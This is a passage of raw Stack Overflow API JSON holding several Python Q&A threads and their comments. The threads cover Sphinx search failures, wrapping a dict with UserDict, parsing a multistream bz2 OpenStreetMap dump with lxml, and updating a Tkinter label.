"last_activity_date": 1497035235, "creation_date": 1497035235, "answer_id": 44465110, "question_id": 29401201, "link": "https://stackoverflow.com/questions/29401201/sphinx-documentation-generator-search-function-hangs-fails/44465110#44465110", "title": "Sphinx documentation generator search function hangs/fails", "body": "<p>It is an old post but just update the <strong>sphinx-rtd-theme</strong> lib and you will be able to search.</p>\n\n<p>See <a href=\"https://github.com/rtfd/sphinx_rtd_theme/pull/346\" rel=\"nofollow noreferrer\">https://github.com/rtfd/sphinx_rtd_theme/pull/346</a></p>\n"}], "owner": {"reputation": 31, "user_id": 4739980, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e2f833ec5ff33af27daa1ada4af25fbd?s=128&d=identicon&r=PG", "display_name": "Mark Aldrich", "link": "https://stackoverflow.com/users/4739980/mark-aldrich"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 442, "favorite_count": 0, "answer_count": 1, "score": 3, "last_activity_date": 1593227713, "creation_date": 1427923820, "last_edit_date": 1593227713, "question_id": 29401201, "link": "https://stackoverflow.com/questions/29401201/sphinx-documentation-generator-search-function-hangs-fails", "title": "Sphinx documentation generator search function hangs/fails", "body": "<p>I am using <em>Sphinx</em> to document my project. The project includes both reST files and Python API files. The built-in Java search function hangs frequently where it states \"Searching...\" with the ellipsis cycling from one period to three. It can find some words in the glossary and the index, but probably less than half of them. I can not find any documentation for this search function.  Unfortunately most searches for <strong>Sphinx</strong> and <strong>search</strong> result in links to the full-text search engine with the same name, <em>Sphinx</em>. What does the search engine look for and how can I make it work consistently?</p>\n"}, {"tags": ["python", "dictionary", "delegates"], "comments": [{"owner": {"reputation": 156940, "user_id": 416467, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/32cad7487ccecc3740a62e797fc326dc?s=128&d=identicon&r=PG", "display_name": "kindall", "link": "https://stackoverflow.com/users/416467/kindall"}, "edited": false, "score": 0, "creation_date": 1427923647, "post_id": 29401119, "comment_id": 46977986, "body": "I don&#39;t see a <code>__getitem__</code>.... or a <code>__setitem__</code>..."}, {"owner": {"reputation": 216457, "user_id": 846892, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/E9dZn.png?s=128&g=1", "display_name": "Ashwini Chaudhary", "link": "https://stackoverflow.com/users/846892/ashwini-chaudhary"}, "edited": false, "score": 0, "creation_date": 1427924019, "post_id": 29401119, "comment_id": 46978140, "body": "The difference between <code>inst.__getitem__(&#39;a&#39;)</code> and <code>inst[&#39;a&#39;]</code> is that the latter will always search for actual <code>__getitem__</code> in the class(considering you&#39;re using a new style class)."}, {"owner": {"reputation": 5307, "user_id": 2372812, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/atrZ9.jpg?s=128&g=1", "display_name": "Tom Dalton", "link": "https://stackoverflow.com/users/2372812/tom-dalton"}, "edited": false, "score": 1, "creation_date": 1427924052, "post_id": 29401119, "comment_id": 46978157, "body": "You may need to implement something like <a href=\"http://stackoverflow.com/questions/9942536/how-to-fake-proxy-a-class-in-python\" title=\"how to fake proxy a class in python\">stackoverflow.com/questions/9942536/&hellip;</a> if you want a really authentic proxy..."}, {"owner": {"reputation": 36618, "user_id": 70170, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/163acaf31cfd01645493404a2d379df6?s=128&d=identicon&r=PG", "display_name": "Jason R. Coombs", "link": "https://stackoverflow.com/users/70170/jason-r-coombs"}, "edited": false, "score": 0, "creation_date": 1427924560, "post_id": 29401119, "comment_id": 46978346, "body": "I&#39;ll add <code>object</code>, and clarify that I&#39;m testing on Python 3."}, {"owner": {"reputation": 79972, "user_id": 298607, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/DVW9g.jpg?s=128&g=1", "display_name": "dawg", "link": "https://stackoverflow.com/users/298607/dawg"}, "edited": false, "score": 1, "creation_date": 1427928083, "post_id": 29401119, "comment_id": 46979718, "body": "This strikes me as an <a href=\"http://meta.stackexchange.com/questions/66377/what-is-the-xy-problem\">XY Problem</a>  Why not just subclass <code>dict</code> and replace the specific methods that you wish to enrich."}, {"owner": {"reputation": 36618, "user_id": 70170, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/163acaf31cfd01645493404a2d379df6?s=128&d=identicon&r=PG", "display_name": "Jason R. Coombs", "link": "https://stackoverflow.com/users/70170/jason-r-coombs"}, "reply_to_user": {"reputation": 79972, "user_id": 298607, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/DVW9g.jpg?s=128&g=1", "display_name": "dawg", "link": "https://stackoverflow.com/users/298607/dawg"}, "edited": false, "score": 0, "creation_date": 1428180376, "post_id": 29401119, "comment_id": 47068293, "body": "@dawg, I added an edit to the question to more explicitly describe my intention - to instrument dict objects that I get from another library, but I want to avoid creating copies, which a dict subclass necessarily does because a dict object has its own intrinsic storage."}, {"owner": {"reputation": 36618, "user_id": 70170, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/163acaf31cfd01645493404a2d379df6?s=128&d=identicon&r=PG", "display_name": "Jason R. Coombs", "link": "https://stackoverflow.com/users/70170/jason-r-coombs"}, "reply_to_user": {"reputation": 79972, "user_id": 298607, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/DVW9g.jpg?s=128&g=1", "display_name": "dawg", "link": "https://stackoverflow.com/users/298607/dawg"}, "edited": false, "score": 0, "creation_date": 1428182043, "post_id": 29401119, "comment_id": 47068692, "body": "@dawg: Perhaps you&#39;re right about the XY Problem. I started with the assumption laid out in the question - that I have a library supplying a tree of dict objects. I want to augment those dictionaries with behavior without the expense of reconstructing that tree with new objects. I&#39;ve found the answer I was seeking, but I&#39;ll consider a follow-up question to the broader problem."}], "answers": [{"comments": [{"owner": {"reputation": 36618, "user_id": 70170, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/163acaf31cfd01645493404a2d379df6?s=128&d=identicon&r=PG", "display_name": "Jason R. Coombs", "link": "https://stackoverflow.com/users/70170/jason-r-coombs"}, "edited": false, "score": 0, "creation_date": 1427932418, "post_id": 29401571, "comment_id": 46981048, "body": "Right - because I can&#39;t use that InstrumentedDict to overlay an existing dict. It will make a copy when the source dict is passed in. It&#39;s important that the original dictionary is mutated with the proxy."}, {"owner": {"reputation": 36618, "user_id": 70170, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/163acaf31cfd01645493404a2d379df6?s=128&d=identicon&r=PG", "display_name": "Jason R. Coombs", "link": "https://stackoverflow.com/users/70170/jason-r-coombs"}, "edited": false, "score": 0, "creation_date": 1428179948, "post_id": 29401571, "comment_id": 47068190, "body": "@frnhr That works beautifully. I had overlooked UserDict because my impression of it was that it was obviated by subclassing dict, but as you&#39;ve now demonstrated, here&#39;s one case where UserDict provides flexibility that subclassing a dict cannot."}], "tags": [], "owner": {"reputation": 10366, "user_id": 236195, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/53fd77df3990f126c69fb6ec4e0ea6de?s=128&d=identicon&r=PG", "display_name": "frnhr", "link": "https://stackoverflow.com/users/236195/frnhr"}, "is_accepted": true, "score": 3, "last_activity_date": 1428099164, "last_edit_date": 1428099164, "creation_date": 1427925466, "answer_id": 29401571, "question_id": 29401119, "link": "https://stackoverflow.com/questions/29401119/delegate-to-a-dict-class-in-python/29401571#29401571", "title": "Delegate to a dict class in Python", "body": "<p>At a risk of completely missing the point of your question...</p>\n\n<p>Is there any reason to build a proxy instead of just subclassing <code>dict</code>? Something like:</p>\n\n<pre><code>class InstrumentedDict(dict):\n    \"\"\" Walks like a dict, talks like a dict... \"\"\"\n</code></pre>\n\n<hr>\n\n<p><strong>Edit after comment:</strong></p>\n\n<p>Ah, I see :)  Makes sense...</p>\n\n<p>Seems like <code>UserDict</code> is the answer, check this out:</p>\n\n<pre><code>from collections import UserDict\n\nclass InstrumentedDict(UserDict):\n\n    def __init__(self, data):\n        super(InstrumentedDict, self).__init__()\n        self.data = data\n\nremote_dict = {\"a\": 1}\ninstr_dict = InstrumentedDict(remote_dict)\n\nprint(instr_dict)  # {'a': 1}\n\ninstr_dict[\"b\"] = 2\n\nprint(instr_dict)  # {'a': 1, 'b': 2}\nprint(remote_dict)  # {'a': 1, 'b': 2}\n</code></pre>\n\n<p><code>UserDict</code> seems to be a relic from olden days when we couldn't subclass <code>dict</code> directly. But it's useful because it exposes <code>data</code> attribute. And that's pretty much all what the docs say: <a href=\"https://docs.python.org/3.4/library/collections.html#userdict-objects\" rel=\"nofollow\">UserDict</a></p>\n"}], "owner": {"reputation": 36618, "user_id": 70170, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/163acaf31cfd01645493404a2d379df6?s=128&d=identicon&r=PG", "display_name": "Jason R. Coombs", "link": "https://stackoverflow.com/users/70170/jason-r-coombs"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 826, "favorite_count": 0, "accepted_answer_id": 29401571, "answer_count": 1, "score": 1, "last_activity_date": 1428180143, "creation_date": 1427923468, "last_edit_date": 1428180143, "question_id": 29401119, "link": "https://stackoverflow.com/questions/29401119/delegate-to-a-dict-class-in-python", "title": "Delegate to a dict class in Python", "body": "<p>In Python 3, I have a tree of lists and dicts that I get from another library. I'd like to instrument the dicts in that tree with objects containing more behavior (giving a richer model to the simple dict classes). I've tried replacing the class of these objects with a subclass of dict, but that is not allowed:</p>\n\n<pre><code>class MyClass(dict): pass\n{}.__class__ = MyClass\n</code></pre>\n\n<p>That fails with <code>TypeError: __class__ assignment: only for heap types</code>.</p>\n\n<p>So I'm instead trying to write a wrapper or adapter or delegate class:</p>\n\n<pre><code>class InstrumentedDict(object):\n    \"\"\"\n    Instrument an existing dictionary with additional\n    functionality, but always reference and mutate\n    the original dictionary.\n\n    &gt;&gt;&gt; orig = {'a': 1, 'b': 2}\n    &gt;&gt;&gt; inst = InstrumentedDict(orig)\n    &gt;&gt;&gt; hasattr(inst, '__getitem__')\n    True\n    &gt;&gt;&gt; inst.__getitem__('a')\n    1\n    &gt;&gt;&gt; inst['a']\n    1\n    &gt;&gt;&gt; inst['c'] = 3\n    &gt;&gt;&gt; orig['c']\n    3\n    &gt;&gt;&gt; inst.keys() == orig.keys()\n    True\n    \"\"\"\n    def __init__(self, orig):\n        self._orig = orig\n\n    def __getattribute__(self, name):\n        orig = super(InstrumentedDict, self).__getattribute__('_orig')\n        return orig.__getattribute__(name)\n</code></pre>\n\n<p>However, the doctests fail at <code>inst['a']</code> with <code>TypeError: 'InstrumentedDict' object is not subscriptable</code>. Note, however, that it doesn't fail to invoke <code>__hasattr__</code> or <code>__getitem__</code>.</p>\n\n<p>I'm hoping to delegate all behavior to the underlying dictionary, and I'd like not to have to think about or explicitly delegate the whole signature of a dictionary.</p>\n\n<p>It's important that whatever this class does should affect the underlying dict (rather than creating separate references to the values). Ideally, it should not impose or negate mutability on the underlying Mapping, but should mirror its behavior.</p>\n\n<p>Is there a simple and elegant solution that meets the specified interface but doesn't require explicit mirroring of the signature (such as in <a href=\"https://bitbucket.org/jaraco/jaraco.collections/src/0c86678fd275b216bc1b0e41be7fc952ca7cf727/jaraco/collections.py?at=default#cl-742\" rel=\"nofollow\">this implementation</a>)?</p>\n\n<p><strong>Edit:</strong> To clarify, I want to overlay behavior on existing dictionaries without creating new copies, such that if the instrumented copy is modified, so is the original.</p>\n"}, {"tags": ["python", "xml", "lxml", "openstreetmap"], "comments": [{"owner": {"reputation": 97835, "user_id": 355230, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/VjcbL.jpg?s=128&g=1", "display_name": "martineau", "link": "https://stackoverflow.com/users/355230/martineau"}, "edited": false, "score": 0, "creation_date": 1427925521, "post_id": 29401068, "comment_id": 46978752, "body": "Can&#39;t tell for sure, of course, but the <code>BZ2File(file.osm.bz2, &#39;rb&#39;)</code> looks incorrect because the first argument is suppose to be a <i>filename</i> (i.e. a string) according to the docs."}, {"owner": {"reputation": 313, "user_id": 1491463, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/976cc04c9dd41291ca6666104cbaf7c7?s=128&d=identicon&r=PG", "display_name": "scities", "link": "https://stackoverflow.com/users/1491463/scities"}, "reply_to_user": {"reputation": 97835, "user_id": 355230, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/VjcbL.jpg?s=128&g=1", "display_name": "martineau", "link": "https://stackoverflow.com/users/355230/martineau"}, "edited": false, "score": 0, "creation_date": 1427927265, "post_id": 29401068, "comment_id": 46979398, "body": "Thanks for pointing this out! But it was correct in the original code, I just edited my question to avoid confusion."}, {"owner": {"reputation": 18935, "user_id": 19405, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a72b55a41a43ea0493fc64641a1ed295?s=128&d=identicon&r=PG", "display_name": "nobody", "link": "https://stackoverflow.com/users/19405/nobody"}, "edited": false, "score": 1, "creation_date": 1427927327, "post_id": 29401068, "comment_id": 46979422, "body": "There could be a bug in the bz2 module (I doubt it gets tested by the maintainers on 40GB inputs very often). Try writing a Python script that uses the bz2 module to decompress the data and write it to a new file, and verify that the output matches the <code>bzcat</code> output."}, {"owner": {"reputation": 313, "user_id": 1491463, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/976cc04c9dd41291ca6666104cbaf7c7?s=128&d=identicon&r=PG", "display_name": "scities", "link": "https://stackoverflow.com/users/1491463/scities"}, "reply_to_user": {"reputation": 18935, "user_id": 19405, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a72b55a41a43ea0493fc64641a1ed295?s=128&d=identicon&r=PG", "display_name": "nobody", "link": "https://stackoverflow.com/users/19405/nobody"}, "edited": false, "score": 1, "creation_date": 1427966435, "post_id": 29401068, "comment_id": 46992088, "body": "Thanks @AndrewMedico, you confirmed what I suspected. Doing a bit of research, I ended up finding this <a href=\"http://bugs.python.org/issue10900\" rel=\"nofollow noreferrer\">issue</a> on the bz2 bug tracker. Which led me to read the <a href=\"http://wiki.openstreetmap.org/wiki/Planet.osm/full\" rel=\"nofollow noreferrer\">OSM wiki</a> saying explicitly that planet.osm.bz2 cannot be read with python&#39;s BZ2File, because dumps are multi-stream Bzip2 files, which are currently not supported by BZ2File. The OSM wiki indicates a workaround which I am going to try. I will post the result as an answer if it works!"}, {"owner": {"reputation": 17760, "user_id": 1340631, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/52d3234f3be58156770e8a91d575bfbd?s=128&d=identicon&r=PG", "display_name": "scai", "link": "https://stackoverflow.com/users/1340631/scai"}, "edited": false, "score": 2, "creation_date": 1427971833, "post_id": 29401068, "comment_id": 46995231, "body": "Not directly related to bz2 but I just wanted to note that you can download pre-filtered OSM data using <a href=\"https://wiki.openstreetmap.org/wiki/Overpass_API\" rel=\"nofollow noreferrer\">Overpass API</a>, thus not having to handle such large files."}, {"owner": {"reputation": 2783, "user_id": 3501889, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Cssmv.jpg?s=128&g=1", "display_name": "mmd", "link": "https://stackoverflow.com/users/3501889/mmd"}, "reply_to_user": {"reputation": 17760, "user_id": 1340631, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/52d3234f3be58156770e8a91d575bfbd?s=128&d=identicon&r=PG", "display_name": "scai", "link": "https://stackoverflow.com/users/1340631/scai"}, "edited": false, "score": 2, "creation_date": 1428059243, "post_id": 29401068, "comment_id": 47031407, "body": "In addition to what @scai recommended, you might take a look at PBF format instead of osm.bz2. It&#39;s much smaller and in general also faster to process."}], "answers": [{"tags": [], "owner": {"reputation": 313, "user_id": 1491463, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/976cc04c9dd41291ca6666104cbaf7c7?s=128&d=identicon&r=PG", "display_name": "scities", "link": "https://stackoverflow.com/users/1491463/scities"}, "is_accepted": true, "score": 6, "last_activity_date": 1428071564, "creation_date": 1428071564, "answer_id": 29434158, "question_id": 29401068, "link": "https://stackoverflow.com/questions/29401068/parsing-a-large-bz2-file-40-gb-with-lxml-iterparse-in-python-error-that-does/29434158#29434158", "title": "Parsing a large .bz2 file (40 GB) with lxml iterparse in python. Error that does not appear with uncompressed file", "body": "<p>It turns out that the problem is with the compressed planet.osm file. </p>\n\n<p>As indicated on the <a href=\"http://wiki.openstreetmap.org/wiki/Planet.osm/full\">OSM Wiki</a>, the planet file is compressed as a <strong>multistream file</strong>, and the bz2 python module cannot read multistream files. However, the bz2 documentation indicates an alternative module that can read such files, <a href=\"https://github.com/nvawda/bz2file\">bz2file</a>. I used it and it works perfectly! </p>\n\n<p>So the code should read:</p>\n\n<pre><code>from lxml import etree as et\nfrom bz2file import BZ2File\n\npath = \"where/my/fileis.osm.bz2\"\nwith BZ2File(path) as xml_file:\n    parser = et.iterparse(xml_file, events=('end',))\n    for events, elem in parser:\n\n        if elem.tag == \"tag\":\n            continue\n        if elem.tag == \"node\":\n            (do something)\n\n\n    ## Do some cleaning\n    # Get rid of that element\n    elem.clear()\n\n    # Also eliminate now-empty references from the root node to node        \n    while elem.getprevious() is not None:\n        del elem.getparent()[0]\n</code></pre>\n\n<p>Also, doing some research on using the PBF format (as advised in the comments), I stumbled upon <a href=\"https://github.com/omniscale/imposm-parser\">imposm.parser</a>, a python module that implements a generic parser for OSM data (in pbf or xml format). You may want to have a look at this!</p>\n"}, {"tags": [], "owner": {"reputation": 21075, "user_id": 196206, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5b3e5f05b6457facb417239ce03739cb?s=128&d=identicon&r=PG", "display_name": "Messa", "link": "https://stackoverflow.com/users/196206/messa"}, "is_accepted": false, "score": 2, "last_activity_date": 1428072067, "creation_date": 1428072067, "answer_id": 29434301, "question_id": 29401068, "link": "https://stackoverflow.com/questions/29401068/parsing-a-large-bz2-file-40-gb-with-lxml-iterparse-in-python-error-that-does/29434301#29434301", "title": "Parsing a large .bz2 file (40 GB) with lxml iterparse in python. Error that does not appear with uncompressed file", "body": "<p>As an alternative you can use the output of <code>bzcat</code> command (which can handle multistream files too):</p>\n\n<pre><code>p = subprocess.Popen([\"bzcat\", \"data.bz2\"], stdout=subprocess.PIPE)\nparser = et.iterparse(p.stdout, ...)\n# at the end just check that p.returncode == 0 so there were no errors\n</code></pre>\n"}], "owner": {"reputation": 313, "user_id": 1491463, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/976cc04c9dd41291ca6666104cbaf7c7?s=128&d=identicon&r=PG", "display_name": "scities", "link": "https://stackoverflow.com/users/1491463/scities"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 3543, "favorite_count": 2, "accepted_answer_id": 29434158, "answer_count": 2, "score": 8, "last_activity_date": 1428072067, "creation_date": 1427923272, "last_edit_date": 1427927218, "question_id": 29401068, "link": "https://stackoverflow.com/questions/29401068/parsing-a-large-bz2-file-40-gb-with-lxml-iterparse-in-python-error-that-does", "title": "Parsing a large .bz2 file (40 GB) with lxml iterparse in python. Error that does not appear with uncompressed file", "body": "<p>I am trying to parse OpenStreetMap's planet.osm, compressed in bz2 format. Because it is already 41G, I don't want to decompress the file completely.</p>\n\n<p>So I figured out how to parse portions of the planet.osm file using bz2 and lxml, using the following code</p>\n\n<pre><code>from lxml import etree as et\nfrom bz2 import BZ2File\n\npath = \"where/my/fileis.osm.bz2\"\nwith BZ2File(path) as xml_file:\n    parser = et.iterparse(xml_file, events=('end',))\n    for events, elem in parser:\n\n        if elem.tag == \"tag\":\n            continue\n        if elem.tag == \"node\":\n            (do something)\n\n\n    ## Do some cleaning\n    # Get rid of that element\n    elem.clear()\n\n    # Also eliminate now-empty references from the root node to node        \n    while elem.getprevious() is not None:\n        del elem.getparent()[0]\n</code></pre>\n\n<p>which works perfectly with the <a href=\"http://download.geofabrik.de/\" rel=\"noreferrer\">Geofabrick extracts</a>. However, when I try to parse the planet-latest.osm.bz2 with the same script I get the error:</p>\n\n<blockquote>\n  <p>xml.etree.XMLSyntaxError: Specification mandate value for attribute num_change, line 3684, column 60</p>\n</blockquote>\n\n<p>Here are the things I tried:</p>\n\n<ul>\n<li>Check the planet-latest.osm.bz2 md5sum</li>\n<li>Check the planet-latest.osm where the script with bz2 stops. There is no apparent error, and the attribute is called \"num_changes\", not \"num_change\" as indicated in the error</li>\n<li>Also I did something stupid, but the error puzzled me: I opened the planet-latest.osm.bz2 in mode 'rb' [c = BZ2File('file.osm.bz2', 'rb')] and then passed c.read() to iterparse(), which returned me an error saying (very long string) cannot be opened. Strange thing, (very long string) ends right where the \"Specification mandate value\" error refers to...</li>\n</ul>\n\n<p>Then I tried to decompress first the planet.osm.gz2 usin a simple</p>\n\n<pre><code>bzcat planet.osm.gz2 &gt; planet.osm\n</code></pre>\n\n<p>And ran the parser directly on planet.osm. And... it worked! I am very puzzled by this, and could not find any pointer to why this may happen and how to solve this. My guess would be there is something going on between the decompression and the parsing, but I am not sure. Please help me understand!</p>\n"}, {"tags": ["python", "python-2.7", "tkinter"], "comments": [{"owner": {"reputation": 1684, "user_id": 4403123, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d3d6cb94cda55242f6537bba6d90e09b?s=128&d=identicon&r=PG&f=1", "display_name": "KSFT", "link": "https://stackoverflow.com/users/4403123/ksft"}, "edited": false, "score": 0, "creation_date": 1427923329, "post_id": 29401059, "comment_id": 46977845, "body": "What are you trying to do? Do you want to round a number?"}, {"owner": {"reputation": 103, "user_id": 2014709, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/sFTqG.jpg?s=128&g=1", "display_name": "jenko_cp", "link": "https://stackoverflow.com/users/2014709/jenko-cp"}, "reply_to_user": {"reputation": 1684, "user_id": 4403123, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d3d6cb94cda55242f6537bba6d90e09b?s=128&d=identicon&r=PG&f=1", "display_name": "KSFT", "link": "https://stackoverflow.com/users/4403123/ksft"}, "edited": false, "score": 0, "creation_date": 1427923501, "post_id": 29401059, "comment_id": 46977920, "body": "Well, what I want is that the program deletes the previous answer instead of just overlapping the new answer."}, {"owner": {"reputation": 1684, "user_id": 4403123, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d3d6cb94cda55242f6537bba6d90e09b?s=128&d=identicon&r=PG&f=1", "display_name": "KSFT", "link": "https://stackoverflow.com/users/4403123/ksft"}, "edited": false, "score": 0, "creation_date": 1427923572, "post_id": 29401059, "comment_id": 46977955, "body": "Are you asking how to remove a label?"}, {"owner": {"reputation": 103, "user_id": 2014709, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/sFTqG.jpg?s=128&g=1", "display_name": "jenko_cp", "link": "https://stackoverflow.com/users/2014709/jenko-cp"}, "reply_to_user": {"reputation": 1684, "user_id": 4403123, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d3d6cb94cda55242f6537bba6d90e09b?s=128&d=identicon&r=PG&f=1", "display_name": "KSFT", "link": "https://stackoverflow.com/users/4403123/ksft"}, "edited": false, "score": 0, "creation_date": 1427924108, "post_id": 29401059, "comment_id": 46978181, "body": "It could be, if there is no other way, then that&#39;s more likely to be the case, although , I don&#39;t know how to do that"}, {"owner": {"reputation": 44584, "user_id": 2617068, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/0nSBO.png?s=128&g=1", "display_name": "TigerhawkT3", "link": "https://stackoverflow.com/users/2617068/tigerhawkt3"}, "edited": false, "score": 0, "creation_date": 1427925719, "post_id": 29401059, "comment_id": 46978830, "body": "You can remove a placed widget from the <code>grid</code> with <code>grid_forget()</code>, but what&#39;s really needed here is a simple <code>config()</code>."}], "answers": [{"tags": [], "owner": {"reputation": 44584, "user_id": 2617068, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/0nSBO.png?s=128&g=1", "display_name": "TigerhawkT3", "link": "https://stackoverflow.com/users/2617068/tigerhawkt3"}, "is_accepted": false, "score": 3, "last_activity_date": 1427923784, "creation_date": 1427923784, "answer_id": 29401186, "question_id": 29401059, "link": "https://stackoverflow.com/questions/29401059/label-and-value-display/29401186#29401186", "title": "Label and value display", "body": "<p>The problem is that, every time you call <code>square_calc()</code>, you are simply creating and placing another <code>Label</code>. The right way to do this is to create a <code>Label</code> outside the function, then have the function update the <code>Label</code>'s text with <code>mylabel.config(text='new text')</code>.</p>\n"}, {"comments": [{"owner": {"reputation": 305939, "user_id": 7432, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/3e3921ee8a7792e4b5da0244933395e8?s=128&d=identicon&r=PG", "display_name": "Bryan Oakley", "link": "https://stackoverflow.com/users/7432/bryan-oakley"}, "edited": false, "score": 0, "creation_date": 1427971277, "post_id": 29403226, "comment_id": 46994930, "body": "An answer like this forces the reader to go line-by-line to look for differences. Your answer would be much better if you added a little bit of an explanation as to what the main problem was. For example, while switching to a class-based solution is good advice, it has  absolutely nothing to do with the problem, but a beginner won&#39;t likely know that."}, {"owner": {"reputation": 97835, "user_id": 355230, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/VjcbL.jpg?s=128&g=1", "display_name": "martineau", "link": "https://stackoverflow.com/users/355230/martineau"}, "reply_to_user": {"reputation": 305939, "user_id": 7432, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/3e3921ee8a7792e4b5da0244933395e8?s=128&d=identicon&r=PG", "display_name": "Bryan Oakley", "link": "https://stackoverflow.com/users/7432/bryan-oakley"}, "edited": false, "score": 0, "creation_date": 1427993342, "post_id": 29403226, "comment_id": 47008435, "body": "@Bryan: Point taken, however now it&#39;s mostly redundant given the other answer."}, {"owner": {"reputation": 103, "user_id": 2014709, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/sFTqG.jpg?s=128&g=1", "display_name": "jenko_cp", "link": "https://stackoverflow.com/users/2014709/jenko-cp"}, "edited": false, "score": 0, "creation_date": 1428635080, "post_id": 29403226, "comment_id": 47256514, "body": "First of all, thanks a lot for the explanation given. I was trying the &#39;config&#39; option, but I was getting : &quot;Exception in Tkinter callback Traceback (most recent call last):   File &quot;C:\\Python27\\lib\\lib-tk\\Tkinter.py&quot;, line 1532, in <b>call</b>     return self.func(*args)   File &quot;C:\\Users\\user03\\Desktop\\Python\\square_root_tk_fail.py&quot;, line 7, in square_calc     sqx_lab[&quot;text&quot;] = str(sqx)... TypeError: &#39;NoneType&#39; object does not support item assignment&quot;; and this is what you mentioned also as a flaw in the code, anyway, I guess I need more experience before I figure out how to use classes."}, {"owner": {"reputation": 97835, "user_id": 355230, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/VjcbL.jpg?s=128&g=1", "display_name": "martineau", "link": "https://stackoverflow.com/users/355230/martineau"}, "edited": false, "score": 0, "creation_date": 1428636739, "post_id": 29403226, "comment_id": 47256918, "body": "You&#39;re welcome. Using Tkinter is difficult, since it&#39;s not well documented and somewhat quirky (in my opinion). Regardless, learning to use classes is very worthwhile objective (pun intended ;-), not just for dealing with Tkinter, but because the concepts can be used just about everywhere to improve the software you develop."}], "tags": [], "owner": {"reputation": 97835, "user_id": 355230, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/VjcbL.jpg?s=128&g=1", "display_name": "martineau", "link": "https://stackoverflow.com/users/355230/martineau"}, "is_accepted": true, "score": 1, "last_activity_date": 1428636074, "last_edit_date": 1428636074, "creation_date": 1427935121, "answer_id": 29403226, "question_id": 29401059, "link": "https://stackoverflow.com/questions/29401059/label-and-value-display/29403226#29403226", "title": "Label and value display", "body": "<p>The display is getting messed-up because every time your <code>square_calc()</code> function is called it creates new pair of <code>Label</code>s, but this may leave some parts of any previous ones visible. Since the one on the left is the same every time, so it's not noticeable with it, but the text in one on the right in column 1 is potentially different every time. </p>\n\n<p>A simple way to fix that is to make the <code>Label</code> a global variable and create it outside the function, and then just change its contents in the function. As with all Tkinter widgets, this is can be done after it's created by calling the existing obj's <code>config()</code> method.</p>\n\n<p>Here's a minimally-modified version of your code that illustrates doing that. Note, it also adds a <code>sticky</code> keyword arugment to the <code>grid()</code> method call for the label to left-justify it within the grid cell so it's closer to the text label immediately to its left (otherwise it would be center-justified within the cell).</p>\n\n<pre><code>from Tkinter import *\n\ndef square_calc():\n    x = x_val.get()\n    sqx = x ** 0.5\n#    print x, \"** 0.5 =\", sqx\n    sqx_txt = Label(root, text = \"x ** 0.5 =\").grid(row=3, column=0)\n    sqx_lab.config(text=sqx)\n    sqx_lab.grid(row=3, column=1, sticky=W)\n\nroot = Tk()\nroot.title(\"Calculating square root\")\n\nx_val = DoubleVar()\n\nx_lab   = Label(root, text = \"x\").grid(row=0, column=0)\nnmb     = Entry(root, textvariable = x_val).grid(row=0, column=1)\ncalc    = Button(root, text = \"Calculate\", command=square_calc).grid(columnspan=2)\ny_lab   = Label(root, text = \" \").grid(row=3, column=0)\nsqx_lab = Label(root, text = \" \")\n\nroot.mainloop()\n</code></pre>\n\n<p>There's another potentially serious flaw in your code. All those assignments of the form</p>\n\n<pre><code>variable = Widget(...).grid(...)\n</code></pre>\n\n<p>result in assigning the value <code>None</code> to the variable because that's what the <code>grid()</code> method returns. I didn't fix them because they do no harm in this cause since none of those variables are ever referenced again, but it would have been a problem if the new globally variable <code>sqx_lab</code> had been done that way since it is referenced elsewhere.</p>\n"}], "owner": {"reputation": 103, "user_id": 2014709, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/sFTqG.jpg?s=128&g=1", "display_name": 